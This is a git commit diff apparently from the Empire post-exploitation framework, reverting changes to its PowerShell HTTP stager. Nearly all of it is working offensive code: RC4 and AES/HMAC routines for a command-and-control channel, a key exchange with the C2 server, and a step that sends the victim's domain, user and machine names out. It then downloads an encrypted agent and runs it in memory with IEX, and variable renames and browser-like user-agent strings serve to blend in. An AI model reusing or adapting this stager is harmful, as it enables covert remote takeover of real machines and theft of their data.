239e631aacdff405e64292f9d069373f93b7c3d1
secur3 <ben.miller@ecfirst.com>
2024-07-17 10:32:18 -0500

    revert changes to address broken agent

--- empire/server/data/agent/stagers/http/http.ps1
+++ empire/server/data/agent/stagers/http/http.ps1
@@ -10,60 +10,61 @@
 {% include 'http/comms.ps1' %}
 
 function Start-Negotiate {
-    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',$hop)
+    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',$hop)
+
     function ConvertTo-RC4ByteStream {
         Param ($RCK, $In)
-        process {
-            ForEach ($Element in $In) {
-                $Index2 = ($Index2 + 1) % 256;
-                $Index1 = ($Index1 + $Array[$Index2]) % 256;
-                $Array[$Index2], $Array[$Index1] = $Array[$Index1], $Array[$Index2];
-                $Element -bxor $Array[($Array[$Index2] + $Array[$Index1]) % 256];
-            }
-        }
         begin {
-            [Byte[]] $Array = 0..255;
-            $Index1 = 0;
+            [Byte[]] $Str = 0..255;
+            $J = 0;
             0..255 | ForEach-Object {
-                $Index1 = ($Index1 + $Array[$_] + $RCK[$_ % $RCK.Length]) % 256;
-                $Array[$_], $Array[$Index1] = $Array[$Index1], $Array[$_];
+                $J = ($J + $Str[$_] + $RCK[$_ % $RCK.Length]) % 256;
+                $Str[$_], $Str[$J] = $Str[$J], $Str[$_];
             };
-            $Index2 = $Index1 = 0;
+            $I = $J = 0;
+        }
+        process {
+            ForEach($Byte in $In) {
+                $I = ($I + 1) % 256;
+                $J = ($J + $Str[$I]) % 256;
+                $Str[$I], $Str[$J] = $Str[$J], $Str[$I];
+                $Byte -bxor $Str[($Str[$I] + $Str[$J]) % 256];
+            }
         }
     }
 
     function Decrypt-Bytes {
         param ($Key, $In)
-        if ($In.Length -gt 32) {
-            $Hasher = New-Object System.Security.Cryptography.HMACSHA256;
-            $Encoder = [System.Text.Encoding]::ASCII;
+        if($In.Length -gt 32) {
+            $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
+            $e=[System.Text.Encoding]::ASCII;
             # Verify the HMAC
-            $MAC = $In[-10..-1];
-            $Data = $In[0..($In.length - 11)];
-            $Hasher.Key = $Encoder.GetBytes($Key);
-            $ExpectedHash = $Hasher.ComputeHash($Data)[0..9];
-            if (@(Compare-Object $MAC $ExpectedHash -Sync 0).Length -ne 0) {
+            $Mac = $In[-10..-1];
+            $In = $In[0..($In.length - 11)];
+            $hmac.Key = $e.GetBytes($Key);
+            $Expected = $hmac.ComputeHash($In)[0..9];
+            if (@(Compare-Object $Mac $Expected -Sync 0).Length -ne 0) {
                 return;
             }
-    
-            # Extract the IV
-            $IV = $Data[0..15];
-            try {
-                $Cipher = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
-            } catch {
-                $Cipher = New-Object System.Security.Cryptography.RijndaelManaged;
+
+            # extract the IV
+            $IV = $In[0..15];
+           try {
+                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
             }
-            $Cipher.Mode = "CBC";
-            $Cipher.Key = $Encoder.GetBytes($Key);
-            $Cipher.IV = $IV;
-            ($Cipher.CreateDecryptor()).TransformFinalBlock(($Data[16..$Data.length]), 0, $Data.Length - 16);
+            catch {
+                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+            }
+            $AES.Mode = "CBC";
+            $AES.Key = $e.GetBytes($Key);
+            $AES.IV = $IV;
+            ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)
         }
     }
-        
 
     # make sure the appropriate assemblies are loaded
-    $nope = [Reflection.Assembly]::LoadWithPartialName("System.Security");
-    $nope = [Reflection.Assembly]::LoadWithPartialName("System.Core");
+    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");
+    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");
 
     # try to ignore all errors
     $ErrorActionPreference = "SilentlyContinue";
@@ -73,16 +74,16 @@ function Start-Negotiate {
     # set up the AES/HMAC crypto
     # $SK -> staging key for this server
     try {
-        $sEa=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
     }
     catch {
-        $sEa=New-Object System.Security.Cryptography.RijndaelManaged;
+        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
     }
     
     $IV = [byte] 0..255 | Get-Random -count 16;
-    $sEa.Mode="CBC";
-    $sEa.Key=$SKB;
-    $sEa.IV = $IV;
+    $AES.Mode="CBC";
+    $AES.Key=$SKB;
+    $AES.IV = $IV;
 
     $hmac = New-Object System.Security.Cryptography.HMACSHA256;
     $hmac.Key = $SKB;
@@ -100,7 +101,7 @@ function Start-Negotiate {
     $ib=$e.getbytes($rk);
 
     # encrypt/HMAC the packet for the c2 server
-    $eb=$IV+$sEa.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
+    $eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
     $eb=$eb+$hmac.ComputeHash($eb)[0..9];
 
     # if the web client doesn't exist, create a new web client and set appropriate options
@@ -158,15 +159,15 @@ function Start-Negotiate {
 
     # create a new AES object
     try {
-        $sEa=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
     }
     catch {
-        $sEa=New-Object System.Security.Cryptography.RijndaelManaged;
+        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
     }
     $IV = [byte] 0..255 | Get-Random -Count 16;
-    $sEa.Mode="CBC";
-    $sEa.Key=$e.GetBytes($key);
-    $sEa.IV = $IV;
+    $AES.Mode="CBC";
+    $AES.Key=$e.GetBytes($key);
+    $AES.IV = $IV;
 
     # get some basic system information
     $i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
@@ -204,7 +205,7 @@ function Start-Negotiate {
 
     # send back the initial system information
     $ib2=$e.getbytes($i);
-    $eb2=$IV+$sEa.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);
+    $eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);
     $hmac.Key = $e.GetBytes($key);
     $eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];
 
@@ -244,11 +245,11 @@ function Start-Negotiate {
     IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
 
     # clear some variables out of memory and cleanup before execution
-    $sEa=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
+    $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
     Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "{{ working_hours }}" -KillDate "{{ kill_date }}" -ProxySettings $Script:Proxy;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
-Start-Negotiate -s "$hom" -SK '{{ staging_key }}' -UA $u -hop "$hop";
+Start-Negotiate -s "$hom" -SK '{{ staging_key }}' -UA $aua -hop "$hop";
